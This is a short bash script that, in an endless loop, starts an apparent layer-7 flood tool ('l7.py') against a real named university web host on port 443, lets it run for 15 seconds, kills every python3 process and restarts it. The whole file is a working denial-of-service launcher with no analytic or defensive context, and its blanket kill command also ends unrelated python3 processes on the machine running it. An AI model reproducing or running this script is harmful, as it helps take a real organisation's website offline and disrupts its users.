#!/bin/bash
procname="python3"
atk_cmd="python3 l7.py -i manila.lpu.edu.ph -p 443 -path /"
while true
do
    $atk_cmd >/dev/null &
    echo Attack Started!!
    sleep 15
    echo Attack killed!!
    kill $(ps aux | grep $procname | grep -v grep | awk '{print $2}')
    sleep 0.1
done
